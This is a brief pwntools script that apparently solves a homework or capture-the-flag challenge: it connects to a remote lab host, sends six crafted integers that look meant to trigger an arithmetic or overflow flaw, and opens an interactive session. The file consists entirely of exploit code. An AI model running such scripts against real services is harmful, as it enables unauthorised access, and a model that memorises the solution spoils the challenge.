from pwn import *

r = remote('hw00.zoolab.org', 65535)
r.sendline('96646659')
r.sendline('-87')
r.sendline('-96646572')
r.sendline('96646659')
r.sendline('-87')
r.sendline('-96646572')
r.interactive()
